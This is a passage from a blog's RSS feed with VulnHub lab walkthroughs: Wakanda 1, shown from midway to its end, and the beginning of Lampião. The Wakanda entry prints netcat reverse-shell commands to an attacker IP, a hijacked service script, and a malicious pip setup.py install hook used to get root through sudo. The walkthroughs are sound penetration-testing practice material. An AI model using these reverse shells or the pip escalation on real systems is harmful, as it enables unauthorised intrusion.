            &amp;lt;a class=&quot;nav-link active&quot; href=&quot;#&quot;&amp;gt;Home&amp;lt;/a&amp;gt;
            &amp;lt;!-- &amp;lt;a class=&quot;nav-link active&quot; href=&quot;?lang=fr&quot;&amp;gt;Fr/a&amp;gt; --&amp;gt;
          &amp;lt;/nav&amp;gt;
        &amp;lt;/div&amp;gt;
      &amp;lt;/header&amp;gt;

      &amp;lt;main role=&quot;main&quot; class=&quot;inner cover&quot;&amp;gt;
        &amp;lt;h1 class=&quot;cover-heading&quot;&amp;gt;Coming soon&amp;lt;/h1&amp;gt;
        &amp;lt;p class=&quot;lead&quot;&amp;gt;
          &amp;lt;?php
            if (isset($_GET['lang']))
          {
          echo $message;
          }
          else
          {
            ?&amp;gt;

            Next opening of the largest vibranium market. The products come directly from the wakanda. stay tuned!
            &amp;lt;?php
          }
?&amp;gt;
        &amp;lt;/p&amp;gt;
        &amp;lt;p class=&quot;lead&quot;&amp;gt;
          &amp;lt;a href=&quot;#&quot; class=&quot;btn btn-lg btn-secondary&quot;&amp;gt;Learn more&amp;lt;/a&amp;gt;
        &amp;lt;/p&amp;gt;
      &amp;lt;/main&amp;gt;

      &amp;lt;footer class=&quot;mastfoot mt-auto&quot;&amp;gt;
        &amp;lt;div class=&quot;inner&quot;&amp;gt;
          &amp;lt;p&amp;gt;Made by&amp;lt;a href=&quot;#&quot;&amp;gt;@mamadou&amp;lt;/a&amp;gt;&amp;lt;/p&amp;gt;
        &amp;lt;/div&amp;gt;
      &amp;lt;/footer&amp;gt;
    &amp;lt;/div&amp;gt;
&amp;lt;/body&amp;gt;&amp;lt;/html&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;We have the password!&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;$password =&quot;Niamey4Ever227!!!&quot; ;//I have to remember it&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;As I suspect it’s for &lt;code class=&quot;highlighter-rouge&quot;&gt;ssh&lt;/code&gt;, we now have to get the username. My first guess wass &lt;code class=&quot;highlighter-rouge&quot;&gt;niamey&lt;/code&gt;.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;root@kali:~# ssh niamey@10.0.0.13 -p 3333
niamey@10.0.0.13's password: 
Permission denied, please try again.
niamey@10.0.0.13's password: 
Permission denied, please try again.
niamey@10.0.0.13's password: 
niamey@10.0.0.13: Permission denied (publickey,password).&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;But it did not work out, so I decided to check &lt;code class=&quot;highlighter-rouge&quot;&gt;mamadou&lt;/code&gt; as it’s the possible creator.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;root@kali:~# ssh mamadou@10.0.0.13 -p 3333
mamadou@10.0.0.13's password: 

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Fri Aug  3 15:53:29 2018 from 192.168.56.1
Python 2.7.9 (default, Jun 29 2016, 13:08:31) 
[GCC 4.9.2] on linux2
Type &quot;help&quot;, &quot;copyright&quot;, &quot;credits&quot; or &quot;license&quot; for more information.


&amp;gt;&amp;gt;&amp;gt; import pty
&amp;gt;&amp;gt;&amp;gt; pty.spawn(&quot;/bin/bash&quot;)
mamadou@Wakanda1:~$ whoami
mamadou
mamadou@Wakanda1:~$ id
uid=1000(mamadou) gid=1000(mamadou) groups=1000(mamadou)&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;At the login we are greeted with the python interpreter, but we can easily spawn the &lt;code class=&quot;highlighter-rouge&quot;&gt;bash&lt;/code&gt; shell with &lt;code class=&quot;highlighter-rouge&quot;&gt;pty&lt;/code&gt;. Now it’s time for more enumeration.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;mamadou@Wakanda1:~$ ls -la
total 24
drwxr-xr-x 2 mamadou mamadou 4096 Aug  5 02:24 .
drwxr-xr-x 4 root    root    4096 Aug  1 15:23 ..
lrwxrwxrwx 1 root    root       9 Aug  5 02:24 .bash_history -&amp;gt; /dev/null
-rw-r--r-- 1 mamadou mamadou  220 Aug  1 13:15 .bash_logout
-rw-r--r-- 1 mamadou mamadou 3515 Aug  1 13:15 .bashrc
-rw-r--r-- 1 mamadou mamadou   41 Aug  1 15:52 flag1.txt
-rw-r--r-- 1 mamadou mamadou  675 Aug  1 13:15 .profile
mamadou@Wakanda1:~$ cat flag1.txt 

Flag : d86b9ad71ca887f4dd1dac86ba1c4dfc&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;And the first flag! Two more to go.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;mamadou@Wakanda1:~$ ls -la /home
total 16
drwxr-xr-x  4 root    root      4096 Aug  1 15:23 .
drwxr-xr-x 22 root    root      4096 Aug  1 13:05 ..
drwxr-xr-x  2 devops  developer 4096 Aug  5 02:25 devops
drwxr-xr-x  2 mamadou mamadou   4096 Aug  5 02:24 mamadou&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;In &lt;code class=&quot;highlighter-rouge&quot;&gt;/home&lt;/code&gt; directory we can see another user &lt;code class=&quot;highlighter-rouge&quot;&gt;devops&lt;/code&gt;, with a second flag inside his directory. While looking for some more clues, I found &lt;code class=&quot;highlighter-rouge&quot;&gt;test&lt;/code&gt; file in &lt;code class=&quot;highlighter-rouge&quot;&gt;/tmp&lt;/code&gt;.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;mamadou@Wakanda1:/$ cd tmp
mamadou@Wakanda1:/tmp$ ls -la
total 32
drwxrwxrwt  7 root   root      4096 Aug  8 10:00 .
drwxr-xr-x 22 root   root      4096 Aug  1 13:05 ..
drwxrwxrwt  2 root   root      4096 Aug  8 05:19 .font-unix
drwxrwxrwt  2 root   root      4096 Aug  8 05:19 .ICE-unix
-rw-r--r--  1 devops developer    4 Aug  8 09:59 test
drwxrwxrwt  2 root   root      4096 Aug  8 05:19 .Test-unix
drwxrwxrwt  2 root   root      4096 Aug  8 05:19 .X11-unix
drwxrwxrwt  2 root   root      4096 Aug  8 05:19 .XIM-unix
mamadou@Wakanda1:/tmp$ cat test
test&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;It’s owner is &lt;code class=&quot;highlighter-rouge&quot;&gt;devops&lt;/code&gt;, so I decided to find more files that he’s an owner of.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;mamadou@Wakanda1:/tmp$ find / -user devops 2&amp;gt;/dev/null
/srv/.antivirus.py
/tmp/test
/home/devops
/home/devops/.bashrc
/home/devops/.profile
/home/devops/.bash_logout
/home/devops/flag2.txt

mamadou@Wakanda1:/tmp$ cat /srv/.antivirus.py 
open('/tmp/test','w').write('test')&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Hey, it’s a python script in &lt;code class=&quot;highlighter-rouge&quot;&gt;/srv/&lt;/code&gt; directory. I decided to change it with &lt;code class=&quot;highlighter-rouge&quot;&gt;os.system('nc -e /bin/sh 10.0.0.4 1337')&lt;/code&gt; that will spawn a reverse shell whenever the script is executed, but I could not find any cronjobs that could execute it. To my amusement, after coming back after a small break, I’ve noticed a shell in my listener.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;root@kali:~# nc -lvp 1337
listening on [any] 1337 ...
10.0.0.13: inverse host lookup failed: Unknown host
connect to [10.0.0.4] from (UNKNOWN) [10.0.0.13] 36433
whoami
devops
python -c 'import pty;pty.spawn(&quot;/bin/bash&quot;);'
devops@Wakanda1:/$ 


devops@Wakanda1:/$ cd home/devops
cd home/devops
devops@Wakanda1:~$ ls -la
ls -la
total 24
drwxr-xr-x 2 devops developer 4096 Aug  5 02:25 .
drwxr-xr-x 4 root   root      4096 Aug  1 15:23 ..
lrwxrwxrwx 1 root   root         9 Aug  5 02:25 .bash_history -&amp;gt; /dev/null
-rw-r--r-- 1 devops developer  220 Aug  1 15:23 .bash_logout
-rw-r--r-- 1 devops developer 3515 Aug  1 15:23 .bashrc
-rw-r----- 1 devops developer   42 Aug  1 15:57 flag2.txt
-rw-r--r-- 1 devops developer  675 Aug  1 15:23 .profile
devops@Wakanda1:~$ cat flag2.txt
cat flag2.txt
Flag 2 : d8ce56398c88e1b4d9e5f83e64c79098&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Now we have a second flag, but what executed this file? I decided to look for the files containing &lt;code class=&quot;highlighter-rouge&quot;&gt;antivirus.py&lt;/code&gt; in it.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;mamadou@Wakanda1:/etc$ grep -Ril .antivirus.py / 2&amp;gt;/dev/null
/lib/systemd/system/antivirus.service
^C
mamadou@Wakanda1:/etc$ cat /lib/systemd/system/antivirus.service 
[Unit]
Description=Antivirus
After=network.target
StartLimitIntervalSec=0

[Service]
Type=simple
Restart=always
RestartSec=300 
User=devops
ExecStart=/usr/bin/env python /srv/.antivirus.py

[Install]
WantedBy=multi-user.target&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Oh, so there it is! Restarted every 300 seconds, a service that will run the antivirus. As this is completed, let’s move to escalation to root.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;devops@Wakanda1:~$ sudo -l
sudo -l
Matching Defaults entries for devops on Wakanda1:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User devops may run the following commands on Wakanda1:
    (ALL) NOPASSWD: /usr/bin/pip&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;We can run as &lt;code class=&quot;highlighter-rouge&quot;&gt;pip&lt;/code&gt; as root, which makes our search much easier. While googling, I’ve found &lt;a href=&quot;https://github.com/0x00-0x00/FakePip&quot;&gt;this technique&lt;/a&gt; to execute command with pip.&lt;/p&gt;

&lt;p&gt;Let’s download &lt;code class=&quot;highlighter-rouge&quot;&gt;setup.py&lt;/code&gt; as instructed and change the base64 encoded string into simple &lt;code class=&quot;highlighter-rouge&quot;&gt;os.system('nc -e /bin/sh 10.0.0.4 443')&lt;/code&gt;. Here is our modified script in &lt;code class=&quot;highlighter-rouge&quot;&gt;fakepip&lt;/code&gt; directory.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;devops@Wakanda1:~/fakepip$ wget 10.0.0.4:8080/setup.py
wget 10.0.0.4:8080/setup.py
--2018-08-08 13:54:39--  http://10.0.0.4:8080/setup.py
Connecting to 10.0.0.4:8080... connected.
HTTP request sent, awaiting response... 200 OK
Length: 545 [text/plain]
Saving to: ‘setup.py’

setup.py            100%[=====================&amp;gt;]     545  --.-KB/s   in 0s     

2018-08-08 13:54:39 (4.85 MB/s) - ‘setup.py’ saved [545/545]

devops@Wakanda1:~/fakepip$ cat setup.py
cat setup.py
from setuptools import setup
from setuptools.command.install import install
import os

class CustomInstall(install):
    def run(self):
        install.run(self)
        os.system('nc -e /bin/sh 10.0.0.4 443')

setup(name='FakePip',
      version='0.0.1',
      description='This will exploit a sudoer able to /usr/bin/pip install *',
      url='https://github.com/0x00-0x00/fakepip',
      author='zc00l',
      author_email='andre.marques@esecurity.com.br',
      license='MIT',
      zip_safe=False,
      cmdclass={'install':CustomInstall})&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Now we’re ready to install the package.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;devops@Wakanda1:~/fakepip$ sudo /usr/bin/pip install . --upgrade --force-reinstall
&amp;lt;sudo /usr/bin/pip install . --upgrade --force-reinstall                     
Unpacking /home/devops/fakepip
  Running setup.py (path:/tmp/pip-4FK12P-build/setup.py) egg_info for package from file:///home/devops/fakepip
    
Installing collected packages: FakePip
  Found existing installation: FakePip 0.0.1
    Uninstalling FakePip:
      Successfully uninstalled FakePip
  Running setup.py install for FakePip&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;And what’s in our listener?&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;root@kali:~# nc -lvp 443
listening on [any] 443 ...
10.0.0.13: inverse host lookup failed: Unknown host
connect to [10.0.0.4] from (UNKNOWN) [10.0.0.13] 51199
whoami
root
python -c 'import pty;pty.spawn(&quot;/bin/bash&quot;);'
root@Wakanda1:/tmp/pip-4FK12P-build# cd /root
cd /root
root@Wakanda1:~# ls -la
ls -la
total 20
drwx------  2 root root 4096 Aug  5 02:26 .
drwxr-xr-x 22 root root 4096 Aug  1 13:05 ..
-rw-r--r--  1 root root  570 Jan 31  2010 .bashrc
-rw-r--r--  1 root root  140 Nov 19  2007 .profile
-rw-r-----  1 root root  429 Aug  1 15:16 root.txt
root@Wakanda1:~# cat root.txt
cat root.txt
 _    _.--.____.--._
( )=.-&quot;:;:;:;;':;:;:;&quot;-._
 \\\:;:;:;:;:;;:;::;:;:;:\
  \\\:;:;:;:;:;;:;:;:;:;:;\
   \\\:;::;:;:;:;:;::;:;:;:\
    \\\:;:;:;:;:;;:;::;:;:;:\
     \\\:;::;:;:;:;:;::;:;:;:\
      \\\;;:;:_:--:_:_:--:_;:;\
       \\\_.-&quot;             &quot;-._\
        \\
         \\
          \\
           \\ Wakanda 1 - by @xMagass
            \\
             \\


Congratulations You are Root!

821ae63dbe0c573eff8b69d451fb21bc&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;And we have a flag!&lt;/p&gt;
</description>
        <pubDate>Thu, 09 Aug 2018 02:00:00 +0200</pubDate>
        <link>http://localhost:4000/vulnhub-wakanda/</link>
        <guid isPermaLink="true">http://localhost:4000/vulnhub-wakanda/</guid>
      </item>
    
      <item>
        <title>Vulnhub.com - Lampião</title>
        <description>&lt;p&gt;Let’s start another quick machine from Vulnhub called &lt;strong&gt;Lampião&lt;/strong&gt;.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;Would you like to keep hacking in your own lab?

Try this brand new vulnerable machine! &quot;Lampião 1&quot;.

Get root!

Level: Easy&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;ul&gt;
  &lt;li&gt;Author: &lt;a href=&quot;https://www.vulnhub.com/author/tiago-tavares,581/&quot;&gt;Tiago Tavares&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;Download: &lt;a href=&quot;https://www.vulnhub.com/entry/lampiao-1,249/&quot;&gt;https://www.vulnhub.com/entry/lampiao-1,249/&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;solution&quot;&gt;Solution&lt;/h3&gt;

&lt;p&gt;Let’s start with &lt;code class=&quot;highlighter-rouge&quot;&gt;nmap&lt;/code&gt; scan.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;root@kali:~# nmap -v -sS -A -T4 10.0.0.12
Starting Nmap 7.70 ( https://nmap.org ) at 2018-08-05 06:18 EDT
NSE: Loaded 148 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 06:18
Completed NSE at 06:18, 0.00s elapsed
Initiating NSE at 06:18
Completed NSE at 06:18, 0.00s elapsed
Initiating ARP Ping Scan at 06:18
Scanning 10.0.0.12 [1 port]
Completed ARP Ping Scan at 06:18, 0.04s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 06:18
Completed Parallel DNS resolution of 1 host. at 06:18, 0.00s elapsed
Initiating SYN Stealth Scan at 06:18
Scanning 10.0.0.12 [1000 ports]
Discovered open port 22/tcp on 10.0.0.12
Discovered open port 80/tcp on 10.0.0.12
Completed SYN Stealth Scan at 06:18, 0.08s elapsed (1000 total ports)
Initiating Service scan at 06:18
Scanning 2 services on 10.0.0.12
Completed Service scan at 06:18, 4.80s elapsed (2 services on 1 host)
Initiating OS detection (try #1) against 10.0.0.12
NSE: Script scanning 10.0.0.12.
Initiating NSE at 06:18
Completed NSE at 06:19, 9.05s elapsed
Initiating NSE at 06:19
Completed NSE at 06:19, 0.02s elapsed
Nmap scan report for 10.0.0.12
Host is up (0.00082s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 46:b1:99:60:7d:81:69:3c:ae:1f:c7:ff:c3:66:e3:10 (DSA)
|   2048 f3:e8:88:f2:2d:d0:b2:54:0b:9c:ad:61:33:59:55:93 (RSA)
|   256 ce:63:2a:f7:53:6e:46:e2:ae:81:e3:ff:b7:16:f4:52 (ECDSA)
|_  256 c6:55:ca:07:37:65:e3:06:c1:d6:5b:77:dc:23:df:cc (ED25519)
80/tcp open  http?
| fingerprint-strings: 
|   NULL: 
|     _____ _ _ 
|     |_|/ ___ ___ __ _ ___ _ _ 
|     \x20| __/ (_| __ \x20|_| |_ 
|     ___/ __| |___/ ___|__,_|___/__, ( ) 
|     |___/ 
|     ______ _ _ _ 
|     ___(_) | | | |
|     \x20/ _` | / _ / _` | | | |/ _` | |
|_    __,_|__,_|_| |_|
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port80-TCP:V=7.70%I=7%D=8/5%Time=5B66CF0D%P=x86_64-pc-linux-gnu%r(NULL,
MAC Address: 08:00:27:25:9F:3F (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Uptime guess: 198.048 days (since Fri Jan 19 04:09:43 2018)
Network Distance: 1 hop
TCP Sequence Prediction: Difficulty=261 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.82 ms 10.0.0.12

NSE: Script Post-scanning.
Initiating NSE at 06:19
Completed NSE at 06:19, 0.00s elapsed
Initiating NSE at 06:19
Completed NSE at 06:19, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.48 seconds
           Raw packets sent: 1023 (45.806KB) | Rcvd: 1015 (41.286KB)&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;From here we can see that both &lt;code class=&quot;highlighter-rouge&quot;&gt;ssh&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;http&lt;/code&gt; services are open. We can start with the web service, and see what’s inside the web page using &lt;code class=&quot;highlighter-rouge&quot;&gt;curl&lt;/code&gt;.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;root@kali:~# curl 10.0.0.12
 _____ _   _                                                      
|_   _| | ( )                                                     
  | | | |_|/ ___    ___  __ _ ___ _   _                           
  | | | __| / __|  / _ \/ _` / __| | | |                          
 _| |_| |_  \__ \ |  __/ (_| \__ \ |_| |_                         
 \___/ \__| |___/  \___|\__,_|___/\__, ( )                        
                                   __/ |/                         
                                  |___/                           
______ _       _                                                _ 
|  ___(_)     | |                                              | |
| |_   _    __| |_   _ _ __ ___   __ _    ___  __ _ _   _  __ _| |
|  _| | |  / _` | | | | '_ ` _ \ / _` |  / _ \/ _` | | | |/ _` | |
| |   | | | (_| | |_| | | | | | | (_| | |  __/ (_| | |_| | (_| |_|
\_|   |_|  \__,_|\__,_|_| |_| |_|\__,_|  \___|\__, |\__,_|\__,_(_)
                                               __/ |              
                                              |___/                                                                                    
                                          ...                                  
                           ./(/.         .,/*/,..,.,..                         
                       ,,                      ..  ,.,..,(                     
                    %.                             .  ...,,.#                  
                 .&amp;amp;..                                    . .,.#                
               (.                                      .,/,/, .*#.             
            .#.                                             .,. .(#            
           (,                                                **, .#%           
         .%                                                    /,..(#          
        .,                                                      ((.,@*.        
       ..                           .,,      .                  ./( ,//        
       (...                 *(#&amp;amp;@@@@@@@@@@@@@@#/.                .,/*%,*       
      %(..               (@@@#   . ( / ,.%@@@@@@@@@@#,*,..  *     .,,*&amp;amp;(       
      @.           ,/#@@@@,  .   .  .,.    .*(@@@@@@@@%%@@@@@(/...,(*,@,,      
     *@.       /#@@@@@@@@ ../*/,..             .&amp;amp;@@@@@@@@@@@&amp;amp;((%(./(/#&amp;amp;&amp;amp;(      
     &amp;amp;(    .(@@@@@@@@@@@,        /*.     (@@%@@@@(##@@@@@@@@@@&amp;amp;@@###%/(@(      
    /@%/#&amp;amp;&amp;amp;@@@@@@*  @@@@    #%##&amp;amp;&amp;amp;&amp;amp;@&amp;amp;(  (@@%%%&amp;amp;&amp;amp;@@@%@@@@(.&amp;amp;@@@@@@@%%###@(.     
    &amp;amp;@@@@@@@@#.     ,@@@%*(@@%%/(&amp;amp;.@@&amp;amp;/%@@#,.#.%,&amp;amp;%&amp;amp;@%*   .%@@@@@@&amp;amp;*(@@%     
    %@@@@%,          .@@*   /*,%&amp;amp;%(@.%  (@./. *(*.@%*@@&amp;amp;        *%@@@@%&amp;amp;@(     
    .@&amp;amp;               %@% *. #. .(% ,.  *@#.  .  #.((@,             /@@@@%     
     ###               #&amp;amp;(*/.  *#*#@#    @&amp;amp;/  , ,,(/&amp;amp;(                *@@%     
     &amp;amp;(%.                  *(,    (@,    @ //*. /*/.,                 #@     
    ,%@@/                  .,/,.  .# (&amp;amp;%@@@% .% (/((             @.&amp;amp;/ ,%(/,    
     (#                   ./#* ,#.   *@*&amp;amp;,,/,(#, &amp;amp;%(          #%*@  %@/##    
     @&amp;amp;/%                    .&amp;amp;&amp;amp;*,@%%&amp;amp;@@@@#*, ./*.@. ((         **%#. (&amp;amp;(#*,   
     %@#%*                     @, (/*.(@@@@@%#*.#@/   ,,&amp;amp;      .%#@#   &amp;amp;(( #   
     .&amp;amp;(,                        %/*#*,.   ,,@@ .  .*.*@     (/@@.   *#(   
                                   /@%#,,/,,&amp;amp;@@(.   (&amp;amp;   &amp;amp;@&amp;amp;,&amp;amp;*@&amp;amp;     %,(    
                 #..&amp;amp;%               ,@&amp;amp;. /%@@(  .&amp;amp;@* #/@@%*/*/.(@# *%.        
             ,.&amp;amp;*  * ..,((.    .#  .%@@@&amp;amp;@&amp;amp;.  (@@ *&amp;amp;@@@/. . @ @&amp;amp;((&amp;amp;@@/#.     
         ,&amp;amp;. .*&amp;amp;/@*&amp;amp;,   ,/.   .&amp;amp;(   %. %%#.#   &amp;amp;&amp;amp;.%@@&amp;amp;@*.    .%,@&amp;amp;./.(.*%@&amp;amp;%,  
       ,/  /@@@%#&amp;amp;@@,.&amp;amp;/   .**  ./&amp;amp;* .#,(   .#@@@@# ,%,,.   .*,%@/.*, (..(@@,%%
    /*,@@@%&amp;amp;(%*@@@@&amp;amp; (,@#.  ,( . /,*&amp;amp;@@,(@@@*    ...   **(,&amp;amp;@,*,* .%/@&amp;amp;%**.
    @&amp;amp;&amp;amp;@@@,///#@@@@@@, ( /@*(*/# .(/&amp;amp;..* *@%,. &amp;amp;,*(,. .%@@*.%@%..,***%@@ .*%,
    @#,@&amp;amp;@@&amp;amp;&amp;amp;**#*/&amp;amp;@@@@@@*,.%*@@*/,,//* %   /@..,,#(/,.&amp;amp;@&amp;amp;*%  @@((,,(//@@#*  *%
    #&amp;amp; .#@@@@*,/(*@@@@@@@@&amp;amp; %.@*&amp;amp;@&amp;amp;,(%. &amp;amp;  . @*.*../@@, ..%,/  ##/.%@@@(..,(%
    .*. (@@@@@*,((@%&amp;amp;@@@@@@@@*  //&amp;amp;  ,@  ..@@#%%#,(&amp;amp;@@/*/%#,   ,@*.%@@@*,*.,#
     .  (@@@@@%.,@&amp;amp;&amp;amp;&amp;amp;@@@@@%@@@**&amp;amp;@(,/  *#  /% @/@@@@&amp;amp;@@* /// .( . .#*#@@&amp;amp;/ ..*&amp;amp;
       .,@@@@@@/%@%%#&amp;amp;@@@#@@@@@( ./#.  #,  ,. &amp;amp;/.,@@@@@(%&amp;amp;@/*   /...@%@@@ .,.(%
       .,&amp;amp;&amp;amp;@@@@(##%@@@%@@@&amp;amp;,*.,,%#   #      #@, /@@@. ,,,  .  .*.  &amp;amp;@@@.. ,*/
        .((@@@@#%* .#@#%@@(....((@@/   ,   ,  /@@&amp;amp;@// ,#@@#  ,..    &amp;amp;@@*. ..*
         /,@@@@%@,  /%@@* . .*/&amp;amp;(#%        .  /@@@@@#.(##@   *., .  ,  %##..,./&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Unfortunately, both &lt;code class=&quot;highlighter-rouge&quot;&gt;dirb &lt;/code&gt;and any tries to enumerate this website failed.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;root@kali:~# dirb http://10.0.0.12

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Sun Aug  5 06:23:24 2018
URL_BASE: http://10.0.0.12/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://10.0.0.12/ ----
                                                                               
(!) FATAL: Too many errors connecting to host
    (Possible cause: COULDNT CONNECT)
                                                                               
-----------------
END_TIME: Sun Aug  5 06:23:31 2018
DOWNLOADED: 0 - FOUND: 0&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;I decided to run another &lt;code class=&quot;highlighter-rouge&quot;&gt;nmap&lt;/code&gt; scan with &lt;code class=&quot;highlighter-rouge&quot;&gt;-p-&lt;/code&gt; option scanning all possible ports.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;root@kali:~# nmap -v -sS -A -T4 -p- 10.0.0.12
Starting Nmap 7.70 ( https://nmap.org ) at 2018-08-05 06:23 EDT
NSE: Loaded 148 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 06:23
Completed NSE at 06:23, 0.00s elapsed
Initiating NSE at 06:23
Completed NSE at 06:23, 0.00s elapsed
Initiating ARP Ping Scan at 06:23
Scanning 10.0.0.12 [1 port]
Completed ARP Ping Scan at 06:23, 0.05s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 06:23
Completed Parallel DNS resolution of 1 host. at 06:23, 0.00s elapsed
Initiating SYN Stealth Scan at 06:23
Scanning 10.0.0.12 [65535 ports]
Discovered open port 22/tcp on 10.0.0.12
Discovered open port 80/tcp on 10.0.0.12
Discovered open port 1898/tcp on 10.0.0.12
Completed SYN Stealth Scan at 06:23, 3.57s elapsed (65535 total ports)
Initiating Service scan at 06:23
Scanning 3 services on 10.0.0.12
Completed Service scan at 06:23, 11.40s elapsed (3 services on 1 host)
Initiating OS detection (try #1) against 10.0.0.12
NSE: Script scanning 10.0.0.12.
Initiating NSE at 06:23
Completed NSE at 06:23, 9.09s elapsed
Initiating NSE at 06:23
Completed NSE at 06:23, 0.04s elapsed
Nmap scan report for 10.0.0.12
Host is up (0.00028s latency).
Not shown: 65532 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 46:b1:99:60:7d:81:69:3c:ae:1f:c7:ff:c3:66:e3:10 (DSA)
|   2048 f3:e8:88:f2:2d:d0:b2:54:0b:9c:ad:61:33:59:55:93 (RSA)
|   256 ce:63:2a:f7:53:6e:46:e2:ae:81:e3:ff:b7:16:f4:52 (ECDSA)
|_  256 c6:55:ca:07:37:65:e3:06:c1:d6:5b:77:dc:23:df:cc (ED25519)
80/tcp   open  http?
| fingerprint-strings: 
|   NULL: 
|     _____ _ _ 
|     |_|/ ___ ___ __ _ ___ _ _ 
|     \x20| __/ (_| __ \x20|_| |_ 
|     ___/ __| |___/ ___|__,_|___/__, ( ) 
|     |___/ 
|     ______ _ _ _ 
|     ___(_) | | | |
